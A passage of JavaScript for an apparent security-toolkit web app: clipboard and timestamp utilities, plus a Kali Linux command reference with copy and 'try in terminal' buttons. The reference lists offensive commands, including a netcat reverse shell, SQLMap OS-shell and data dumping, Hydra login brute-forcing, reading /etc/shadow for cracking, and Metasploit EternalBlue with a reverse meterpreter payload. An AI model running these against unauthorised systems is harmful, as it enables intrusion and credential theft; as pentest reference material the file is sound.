            if (passwordOutput.value) {
                navigator.clipboard.writeText(passwordOutput.value);
                const btn = document.getElementById('btn-copy-password');
                const originalText = btn.textContent;
                btn.textContent = 'COPIED!';
                setTimeout(() => btn.textContent = originalText, 1000);
            }
        });

        document.getElementById('btn-password-clear').addEventListener('click', () => {
            passwordOutput.value = '';
            passwordStrength.innerHTML = '';
        });
    }

    // --- Timestamp Converter Tool ---
    const currentTimestamp = document.getElementById('current-timestamp');

    if (currentTimestamp) {
        // Update current timestamp every second
        function updateCurrentTimestamp() {
            currentTimestamp.textContent = Math.floor(Date.now() / 1000);
        }
        setInterval(updateCurrentTimestamp, 1000);
        updateCurrentTimestamp();

        document.getElementById('btn-copy-timestamp').addEventListener('click', () => {
            navigator.clipboard.writeText(currentTimestamp.textContent);
            const btn = document.getElementById('btn-copy-timestamp');
            const originalText = btn.textContent;
            btn.textContent = 'COPIED!';
            setTimeout(() => btn.textContent = originalText, 1000);
        });

        document.getElementById('btn-unix-to-human').addEventListener('click', () => {
            const input = document.getElementById('unix-input').value.trim();
            const isMs = document.getElementById('unix-milliseconds').checked;

            if (!input) {
                alert('Please enter a Unix timestamp');
                return;
            }

            let timestamp = parseInt(input);
            if (isNaN(timestamp)) {
                document.getElementById('unix-result').value = 'ERROR: INVALID TIMESTAMP';
                return;
            }

            // Convert to milliseconds if needed
            if (!isMs) {
                timestamp *= 1000;
            }

            const date = new Date(timestamp);
            const result = [
                `LOCAL: ${date.toLocaleString()}`,
                `UTC: ${date.toUTCString()}`,
                `ISO 8601: ${date.toISOString()}`,
                `DATE: ${date.toDateString()}`,
                `TIME: ${date.toTimeString()}`
            ].join('\n');

            document.getElementById('unix-result').value = result;
        });

        document.getElementById('btn-human-to-unix').addEventListener('click', () => {
            const input = document.getElementById('human-input').value;

            if (!input) {
                alert('Please select a date and time');
                return;
            }

            const date = new Date(input);
            const seconds = Math.floor(date.getTime() / 1000);
            const ms = date.getTime();

            const result = [
                `SECONDS: ${seconds}`,
                `MILLISECONDS: ${ms}`,
                `ISO 8601: ${date.toISOString()}`
            ].join('\n');

            document.getElementById('human-result').value = result;
        });

        document.getElementById('btn-set-now').addEventListener('click', () => {
            const now = new Date();
            // Format for datetime-local input
            const offset = now.getTimezoneOffset();
            const local = new Date(now.getTime() - offset * 60000);
            document.getElementById('human-input').value = local.toISOString().slice(0, 16);
        });

        document.getElementById('btn-timestamp-clear').addEventListener('click', () => {
            document.getElementById('unix-input').value = '';
            document.getElementById('unix-result').value = '';
            document.getElementById('human-input').value = '';
            document.getElementById('human-result').value = '';
        });
    }

    // --- Kali Linux Tools Database ---
    const kaliTools = {
        nmap: {
            name: 'Nmap',
            fullName: 'Network Mapper',
            category: 'Network Analysis',
            description: 'Nmap is a free and open-source network scanner used to discover hosts and services on a computer network by sending packets and analyzing the responses.',
            installation: 'apt install nmap',
            commands: [
                { cmd: 'nmap <target>', desc: 'Basic scan - discovers open ports', example: 'nmap 192.168.1.1' },
                { cmd: 'nmap -sS <target>', desc: 'TCP SYN scan (stealth scan)', example: 'nmap -sS 192.168.1.1' },
                { cmd: 'nmap -sV <target>', desc: 'Service version detection', example: 'nmap -sV 192.168.1.1' },
                { cmd: 'nmap -O <target>', desc: 'OS detection', example: 'nmap -O 192.168.1.1' },
                { cmd: 'nmap -A <target>', desc: 'Aggressive scan (OS, version, scripts, traceroute)', example: 'nmap -A 192.168.1.1' },
                { cmd: 'nmap -p <ports> <target>', desc: 'Scan specific ports', example: 'nmap -p 22,80,443 192.168.1.1' },
                { cmd: 'nmap -p- <target>', desc: 'Scan all 65535 ports', example: 'nmap -p- 192.168.1.1' },
                { cmd: 'nmap -sU <target>', desc: 'UDP scan', example: 'nmap -sU 192.168.1.1' },
                { cmd: 'nmap -sn <network>', desc: 'Ping sweep (host discovery)', example: 'nmap -sn 192.168.1.0/24' },
                { cmd: 'nmap --script <script> <target>', desc: 'Run NSE scripts', example: 'nmap --script vuln 192.168.1.1' },
                { cmd: 'nmap -oN <file> <target>', desc: 'Output to normal file', example: 'nmap -oN scan.txt 192.168.1.1' },
                { cmd: 'nmap -oX <file> <target>', desc: 'Output to XML file', example: 'nmap -oX scan.xml 192.168.1.1' },
                { cmd: 'nmap -T<0-5> <target>', desc: 'Timing template (0=paranoid, 5=insane)', example: 'nmap -T4 192.168.1.1' },
                { cmd: 'nmap -Pn <target>', desc: 'Skip host discovery (treat as online)', example: 'nmap -Pn 192.168.1.1' }
            ]
        },
        wireshark: {
            name: 'Wireshark / tshark',
            fullName: 'Network Protocol Analyzer',
            category: 'Network Analysis',
            description: 'Wireshark is a network protocol analyzer that captures and analyzes network traffic. tshark is its command-line equivalent.',
            installation: 'apt install wireshark tshark',
            commands: [
                { cmd: 'tshark -i <interface>', desc: 'Capture on interface', example: 'tshark -i eth0' },
                { cmd: 'tshark -i <interface> -w <file>', desc: 'Capture and save to file', example: 'tshark -i eth0 -w capture.pcap' },
                { cmd: 'tshark -r <file>', desc: 'Read from pcap file', example: 'tshark -r capture.pcap' },
                { cmd: 'tshark -i <interface> -f "<filter>"', desc: 'Capture with BPF filter', example: 'tshark -i eth0 -f "port 80"' },
                { cmd: 'tshark -r <file> -Y "<filter>"', desc: 'Display filter on file', example: 'tshark -r capture.pcap -Y "http"' },
                { cmd: 'tshark -D', desc: 'List available interfaces', example: 'tshark -D' },
                { cmd: 'tshark -i <interface> -c <count>', desc: 'Capture specific number of packets', example: 'tshark -i eth0 -c 100' },
                { cmd: 'tshark -r <file> -T fields -e <field>', desc: 'Extract specific fields', example: 'tshark -r cap.pcap -T fields -e ip.src -e ip.dst' },
                { cmd: 'tshark -i <interface> -Y "tcp.port==443"', desc: 'Filter HTTPS traffic', example: 'tshark -i eth0 -Y "tcp.port==443"' },
                { cmd: 'tshark -r <file> -z io,stat,1', desc: 'Show I/O statistics', example: 'tshark -r capture.pcap -z io,stat,1' }
            ]
        },
        netcat: {
            name: 'Netcat',
            fullName: 'TCP/UDP Swiss Army Knife',
            category: 'Network Analysis',
            description: 'Netcat (nc) is a versatile networking utility for reading/writing data across network connections using TCP or UDP.',
            installation: 'apt install netcat-openbsd',
            commands: [
                { cmd: 'nc <host> <port>', desc: 'Connect to a host and port', example: 'nc 192.168.1.1 80' },
                { cmd: 'nc -l -p <port>', desc: 'Listen on a port', example: 'nc -l -p 4444' },
                { cmd: 'nc -lvp <port>', desc: 'Listen verbosely', example: 'nc -lvp 4444' },
                { cmd: 'nc -z <host> <port-range>', desc: 'Port scanning', example: 'nc -z 192.168.1.1 20-100' },
                { cmd: 'nc -e /bin/bash <host> <port>', desc: 'Reverse shell', example: 'nc -e /bin/bash 192.168.1.100 4444' },
                { cmd: 'nc -l -p <port> > file', desc: 'Receive file', example: 'nc -l -p 1234 > received.txt' },
                { cmd: 'nc <host> <port> < file', desc: 'Send file', example: 'nc 192.168.1.1 1234 < send.txt' },
                { cmd: 'nc -u <host> <port>', desc: 'UDP mode', example: 'nc -u 192.168.1.1 53' },
                { cmd: 'nc -v <host> <port>', desc: 'Verbose output', example: 'nc -v 192.168.1.1 22' },
                { cmd: 'nc -w <seconds> <host> <port>', desc: 'Set timeout', example: 'nc -w 5 192.168.1.1 80' }
            ]
        },
        nikto: {
            name: 'Nikto',
            fullName: 'Web Server Scanner',
            category: 'Vulnerability Analysis',
            description: 'Nikto is an open-source web server scanner that tests for dangerous files, outdated server software, and other security issues.',
            installation: 'apt install nikto',
            commands: [
                { cmd: 'nikto -h <host>', desc: 'Basic scan', example: 'nikto -h http://192.168.1.1' },
                { cmd: 'nikto -h <host> -p <port>', desc: 'Scan specific port', example: 'nikto -h 192.168.1.1 -p 8080' },
                { cmd: 'nikto -h <host> -ssl', desc: 'Force SSL mode', example: 'nikto -h 192.168.1.1 -ssl' },
                { cmd: 'nikto -h <host> -o <file>', desc: 'Output to file', example: 'nikto -h 192.168.1.1 -o report.txt' },
                { cmd: 'nikto -h <host> -Format htm', desc: 'HTML output format', example: 'nikto -h 192.168.1.1 -o report.html -Format htm' },
                { cmd: 'nikto -h <host> -Tuning <x>', desc: 'Scan tuning (1-9,a-c)', example: 'nikto -h 192.168.1.1 -Tuning 9' },
                { cmd: 'nikto -h <host> -evasion <1-8>', desc: 'IDS evasion techniques', example: 'nikto -h 192.168.1.1 -evasion 1' },
                { cmd: 'nikto -h <host> -C all', desc: 'Scan all CGI directories', example: 'nikto -h 192.168.1.1 -C all' },
                { cmd: 'nikto -update', desc: 'Update plugins and databases', example: 'nikto -update' },
                { cmd: 'nikto -list-plugins', desc: 'List available plugins', example: 'nikto -list-plugins' }
            ]
        },
        sqlmap: {
            name: 'SQLMap',
            fullName: 'SQL Injection Tool',
            category: 'Vulnerability Analysis',
            description: 'SQLMap is an open-source penetration testing tool that automates the detection and exploitation of SQL injection flaws.',
            installation: 'apt install sqlmap',
            commands: [
                { cmd: 'sqlmap -u "<url>"', desc: 'Test URL for SQL injection', example: 'sqlmap -u "http://site.com/page?id=1"' },
                { cmd: 'sqlmap -u "<url>" --dbs', desc: 'Enumerate databases', example: 'sqlmap -u "http://site.com/page?id=1" --dbs' },
                { cmd: 'sqlmap -u "<url>" -D <db> --tables', desc: 'Enumerate tables', example: 'sqlmap -u "http://site.com/page?id=1" -D testdb --tables' },
                { cmd: 'sqlmap -u "<url>" -D <db> -T <table> --columns', desc: 'Enumerate columns', example: 'sqlmap -u "..." -D testdb -T users --columns' },
                { cmd: 'sqlmap -u "<url>" -D <db> -T <table> --dump', desc: 'Dump table data', example: 'sqlmap -u "..." -D testdb -T users --dump' },
                { cmd: 'sqlmap -u "<url>" --forms', desc: 'Automatically test forms', example: 'sqlmap -u "http://site.com/login" --forms' },
                { cmd: 'sqlmap -u "<url>" --batch', desc: 'Non-interactive mode', example: 'sqlmap -u "..." --batch' },
                { cmd: 'sqlmap -u "<url>" --level=5 --risk=3', desc: 'Maximum testing', example: 'sqlmap -u "..." --level=5 --risk=3' },
                { cmd: 'sqlmap -u "<url>" --os-shell', desc: 'Get OS shell', example: 'sqlmap -u "..." --os-shell' },
                { cmd: 'sqlmap -r <request.txt>', desc: 'Load request from file', example: 'sqlmap -r request.txt' }
            ]
        },
        hydra: {
            name: 'Hydra',
            fullName: 'Login Cracker',
            category: 'Password Attacks',
            description: 'Hydra is a fast and flexible online password cracking tool supporting numerous protocols including SSH, FTP, HTTP, and more.',
            installation: 'apt install hydra',
            commands: [
                { cmd: 'hydra -l <user> -P <wordlist> <host> ssh', desc: 'SSH brute force', example: 'hydra -l admin -P wordlist.txt 192.168.1.1 ssh' },
                { cmd: 'hydra -L <users> -P <wordlist> <host> ssh', desc: 'Multiple users SSH', example: 'hydra -L users.txt -P pass.txt 192.168.1.1 ssh' },
                { cmd: 'hydra -l <user> -P <wordlist> ftp://<host>', desc: 'FTP brute force', example: 'hydra -l admin -P wordlist.txt ftp://192.168.1.1' },
                { cmd: 'hydra -l <user> -P <wordlist> <host> http-post-form "<path>:<data>:<fail>"', desc: 'HTTP POST form', example: 'hydra -l admin -P pass.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"' },
                { cmd: 'hydra -l <user> -P <wordlist> <host> http-get /<path>', desc: 'HTTP Basic Auth', example: 'hydra -l admin -P pass.txt 192.168.1.1 http-get /admin' },
                { cmd: 'hydra -l <user> -P <wordlist> <host> mysql', desc: 'MySQL brute force', example: 'hydra -l root -P pass.txt 192.168.1.1 mysql' },
                { cmd: 'hydra -l <user> -P <wordlist> rdp://<host>', desc: 'RDP brute force', example: 'hydra -l administrator -P pass.txt rdp://192.168.1.1' },
                { cmd: 'hydra -t <threads> ...', desc: 'Set parallel tasks', example: 'hydra -t 16 -l admin -P pass.txt 192.168.1.1 ssh' },
                { cmd: 'hydra -V ...', desc: 'Verbose output', example: 'hydra -V -l admin -P pass.txt 192.168.1.1 ssh' },
                { cmd: 'hydra -o <file> ...', desc: 'Output results to file', example: 'hydra -o results.txt -l admin -P pass.txt 192.168.1.1 ssh' }
            ]
        },
        john: {
            name: 'John the Ripper',
            fullName: 'Password Cracker',
            category: 'Password Attacks',
            description: 'John the Ripper is a fast password cracker for detecting weak Unix passwords and cracking various hash types.',
            installation: 'apt install john',
            commands: [
                { cmd: 'john <hashfile>', desc: 'Crack password hashes', example: 'john hashes.txt' },
                { cmd: 'john --wordlist=<file> <hashfile>', desc: 'Dictionary attack', example: 'john --wordlist=rockyou.txt hashes.txt' },
                { cmd: 'john --format=<type> <hashfile>', desc: 'Specify hash format', example: 'john --format=raw-md5 hashes.txt' },
                { cmd: 'john --show <hashfile>', desc: 'Show cracked passwords', example: 'john --show hashes.txt' },
                { cmd: 'john --list=formats', desc: 'List supported formats', example: 'john --list=formats' },
                { cmd: 'unshadow /etc/passwd /etc/shadow > file', desc: 'Combine passwd and shadow', example: 'unshadow /etc/passwd /etc/shadow > unshadowed.txt' },
                { cmd: 'john --incremental <hashfile>', desc: 'Incremental/brute force mode', example: 'john --incremental hashes.txt' },
                { cmd: 'john --rules --wordlist=<file> <hashfile>', desc: 'Apply word mangling rules', example: 'john --rules --wordlist=pass.txt hashes.txt' },
                { cmd: 'john --restore', desc: 'Resume interrupted session', example: 'john --restore' },
                { cmd: 'zip2john <file.zip> > hash.txt', desc: 'Extract ZIP hash', example: 'zip2john secret.zip > hash.txt' }
            ]
        },
        whois: {
            name: 'Whois',
            fullName: 'Domain Information Lookup',
            category: 'Information Gathering',
            description: 'Whois is a query/response protocol used to query databases that store registered users or assignees of domain names and IP addresses.',
            installation: 'apt install whois',
            commands: [
                { cmd: 'whois <domain>', desc: 'Domain lookup', example: 'whois example.com' },
                { cmd: 'whois <ip>', desc: 'IP address lookup', example: 'whois 8.8.8.8' },
                { cmd: 'whois -h <server> <domain>', desc: 'Query specific whois server', example: 'whois -h whois.verisign-grs.com example.com' },
                { cmd: 'whois <domain> | grep -i "name server"', desc: 'Get name servers only', example: 'whois example.com | grep -i "name server"' },
                { cmd: 'whois <domain> | grep -i "registrar"', desc: 'Get registrar info', example: 'whois example.com | grep -i "registrar"' },
                { cmd: 'whois <domain> | grep -i "creation"', desc: 'Get creation date', example: 'whois example.com | grep -i "creation"' },
                { cmd: 'whois <domain> | grep -i "expir"', desc: 'Get expiration date', example: 'whois example.com | grep -i "expir"' },
                { cmd: 'whois -a <domain>', desc: 'Show all matches (verbose)', example: 'whois -a example.com' }
            ]
        },
        dig: {
            name: 'Dig',
            fullName: 'DNS Lookup Utility',
            category: 'Information Gathering',
            description: 'Dig (Domain Information Groper) is a flexible tool for interrogating DNS name servers and performing DNS lookups.',
            installation: 'apt install dnsutils',
            commands: [
                { cmd: 'dig <domain>', desc: 'Basic DNS lookup (A record)', example: 'dig example.com' },
                { cmd: 'dig <domain> ANY', desc: 'Query all record types', example: 'dig example.com ANY' },
                { cmd: 'dig <domain> MX', desc: 'Query MX records', example: 'dig example.com MX' },
                { cmd: 'dig <domain> NS', desc: 'Query name servers', example: 'dig example.com NS' },
                { cmd: 'dig <domain> TXT', desc: 'Query TXT records', example: 'dig example.com TXT' },
                { cmd: 'dig <domain> AAAA', desc: 'Query IPv6 address', example: 'dig example.com AAAA' },
                { cmd: 'dig @<server> <domain>', desc: 'Query specific DNS server', example: 'dig @8.8.8.8 example.com' },
                { cmd: 'dig +short <domain>', desc: 'Short output (IP only)', example: 'dig +short example.com' },
                { cmd: 'dig +trace <domain>', desc: 'Trace DNS delegation path', example: 'dig +trace example.com' },
                { cmd: 'dig -x <ip>', desc: 'Reverse DNS lookup', example: 'dig -x 8.8.8.8' },
                { cmd: 'dig <domain> +noall +answer', desc: 'Show only answer section', example: 'dig example.com +noall +answer' },
                { cmd: 'dig axfr @<ns> <domain>', desc: 'Zone transfer (if allowed)', example: 'dig axfr @ns1.example.com example.com' }
            ]
        },
        metasploit: {
            name: 'Metasploit',
            fullName: 'Penetration Testing Framework',
            category: 'Exploitation',
            description: 'Metasploit Framework is a powerful penetration testing platform that enables finding security issues, verifying vulnerabilities, and managing security assessments.',
            installation: 'apt install metasploit-framework',
            commands: [
                { cmd: 'msfconsole', desc: 'Start Metasploit console', example: 'msfconsole' },
                { cmd: 'search <keyword>', desc: 'Search for exploits/modules', example: 'search type:exploit platform:windows smb' },
                { cmd: 'use <module>', desc: 'Select a module', example: 'use exploit/windows/smb/ms17_010_eternalblue' },
                { cmd: 'info', desc: 'Show module information', example: 'info' },
                { cmd: 'show options', desc: 'Display module options', example: 'show options' },
                { cmd: 'set <option> <value>', desc: 'Set module option', example: 'set RHOSTS 192.168.1.1' },
                { cmd: 'set PAYLOAD <payload>', desc: 'Set payload', example: 'set PAYLOAD windows/x64/meterpreter/reverse_tcp' },
                { cmd: 'exploit / run', desc: 'Execute the module', example: 'exploit' },
                { cmd: 'sessions -l', desc: 'List active sessions', example: 'sessions -l' },
                { cmd: 'sessions -i <id>', desc: 'Interact with session', example: 'sessions -i 1' },
                { cmd: 'background', desc: 'Background current session', example: 'background' },
                { cmd: 'db_nmap <args>', desc: 'Run nmap and import results', example: 'db_nmap -sV 192.168.1.0/24' }
            ],
            note: '⚠️ Metasploit requires proper setup. Use msfdb init to initialize the database.'
        }
    };

    // Render Kali tools grid on the all-tools page
    function renderKaliToolsGrid() {
        const grid = document.getElementById('kali-tools-grid');
        if (!grid) return;

        const categories = {};
        Object.entries(kaliTools).forEach(([id, tool]) => {
            if (!categories[tool.category]) categories[tool.category] = [];
            categories[tool.category].push({ id, ...tool });
        });

        let html = '';
        Object.entries(categories).forEach(([category, tools]) => {
            html += `<div class="kali-category">
                <h3>${category}</h3>
                <div class="kali-tools-list">
                    ${tools.map(tool => `
                        <div class="kali-tool-card" data-route="kali/${tool.id}">
                            <div class="kali-tool-name">${tool.name}</div>
                            <div class="kali-tool-desc">${tool.description.substring(0, 80)}...</div>
                            <div class="kali-tool-count">${tool.commands.length} commands</div>
                        </div>
                    `).join('')}
                </div>
            </div>`;
        });

        grid.innerHTML = html;

        // Add click handlers
        grid.querySelectorAll('.kali-tool-card').forEach(card => {
            card.addEventListener('click', () => {
                navigateTo(card.dataset.route);
            });
        });
    }

    // Render individual Kali tool detail page
    function renderKaliToolDetail(toolId) {
        const tool = kaliTools[toolId];
        const panel = document.getElementById(`kali-${toolId}-tool`);
        if (!tool || !panel) {
            console.error('Kali tool render failed:', toolId, 'tool:', !!tool, 'panel:', !!panel);
            return;
        }

        try {
            panel.innerHTML = `
            <h2>// ${tool.name.toUpperCase()}</h2>
            <div class="tool-interface">
                <div class="kali-tool-header">
                    <div class="kali-tool-info">
                        <span class="kali-badge">${tool.category}</span>
                        <h3>${tool.fullName}</h3>
                        <p>${tool.description}</p>
                        ${tool.note ? `<div class="kali-note">${tool.note}</div>` : ''}
                    </div>
                    <div class="kali-install">
                        <label>INSTALLATION:</label>
                        <code id="install-${toolId}">${tool.installation}</code>
                        <button class="cyber-btn small copy-install-btn" data-target="install-${toolId}">COPY</button>
                    </div>
                </div>

                <h3>COMMANDS REFERENCE</h3>
                <div class="kali-commands-table">
                    <table>
                        <thead>
                            <tr>
                                <th>COMMAND</th>
                                <th>DESCRIPTION</th>
                                <th>EXAMPLE</th>
                                <th>ACTIONS</th>
                            </tr>
                        </thead>
                        <tbody>
                            ${tool.commands.map((cmd, idx) => `
                                <tr>
                                    <td><code>${escapeHtml(cmd.cmd)}</code></td>
                                    <td>${cmd.desc}</td>
                                    <td><code class="example" id="cmd-${toolId}-${idx}">${escapeHtml(cmd.example)}</code></td>
                                    <td class="actions">
                                        <button class="cyber-btn small copy-cmd-btn" data-target="cmd-${toolId}-${idx}">COPY</button>
                                        <button class="cyber-btn small try-terminal" data-target="cmd-${toolId}-${idx}">TRY</button>
                                    </td>
                                </tr>
                            `).join('')}
                        </tbody>
                    </table>
                </div>
            </div>
        `;

            // Add copy button handlers
            panel.querySelectorAll('.copy-install-btn, .copy-cmd-btn').forEach(btn => {
                btn.addEventListener('click', () => {
                    const targetId = btn.dataset.target;
                    const targetEl = document.getElementById(targetId);
                    if (targetEl) {
                        navigator.clipboard.writeText(targetEl.textContent);
                        const origText = btn.textContent;
                        btn.textContent = 'COPIED!';
                        setTimeout(() => btn.textContent = origText, 1000);
                    }
                });
            });

            // Add TRY IN TERMINAL handlers
            panel.querySelectorAll('.try-terminal').forEach(btn => {
                btn.addEventListener('click', () => {
                    const targetId = btn.dataset.target;
                    const targetEl = document.getElementById(targetId);
                    if (targetEl) {
                        tryInTerminal(targetEl.textContent);
                    }
                });
            });
        } catch (err) {
            console.error('Error rendering kali tool:', toolId, err);
        }
    }

    // Helper: escape HTML
    function escapeHtml(str) {
        return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
    }

    // Helper: escape JS string
    function escapeJs(str) {
        return str.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"');
    }

    // Copy to clipboard helper (global)
    window.copyToClipboard = function(text) {
        navigator.clipboard.writeText(text).then(() => {
            // Brief visual feedback could be added here
        });
    };

    // Try command in terminal
    function tryInTerminal(cmd) {
        // Store command to be used by terminal
        localStorage.setItem('cyber_terminal_cmd', cmd);
        // Navigate to terminal
        navigateTo('terminal/shell');
        // Show notification
        setTimeout(() => {
            alert(`Command copied! Paste it in the terminal:\n\n${cmd}`);
        }, 300);
    }

    // Initialize Kali tools pages
    console.log('Initializing Kali tools, count:', Object.keys(kaliTools).length);
    renderKaliToolsGrid();
    Object.keys(kaliTools).forEach(toolId => {
        console.log('Rendering:', toolId);
        renderKaliToolDetail(toolId);
    });
    console.log('Kali tools initialization complete');

    // Event delegation for Kali tool COPY and TRY buttons (static HTML)
    document.body.addEventListener('click', function(e) {
        // Handle COPY buttons
        const copyBtn = e.target.closest('.copy-btn');
        if (copyBtn && copyBtn.dataset.copy) {
            e.preventDefault();
            e.stopPropagation();
            const text = copyBtn.dataset.copy;
            navigator.clipboard.writeText(text).then(() => {
                const origText = copyBtn.textContent;
                copyBtn.textContent = 'COPIED!';
                copyBtn.style.background = '#00ff00';
                copyBtn.style.color = '#000';
                setTimeout(() => {
                    copyBtn.textContent = origText;
                    copyBtn.style.background = '';
                    copyBtn.style.color = '';
                }, 1000);
            }).catch(err => {
                console.error('Copy failed:', err);
                alert('Copy failed. Command: ' + text);
            });
            return;
        }
        
        // Handle TRY buttons
        const tryBtn = e.target.closest('.try-btn');
        if (tryBtn && tryBtn.dataset.cmd) {
            e.preventDefault();
            e.stopPropagation();
            const cmd = tryBtn.dataset.cmd;
            // Store command and navigate to terminal
            localStorage.setItem('cyber_terminal_cmd', cmd);
            navigateTo('terminal/shell');
            setTimeout(() => {
                alert('Command ready! Paste it in the terminal:\n\n' + cmd);
            }, 500);
            return;
        }
        
        // Handle Kali tool card clicks
        const card = e.target.closest('.kali-tool-card');
        if (card && card.dataset.route) {
            e.preventDefault();
            navigateTo(card.dataset.route);
            return;
        }
    });

});
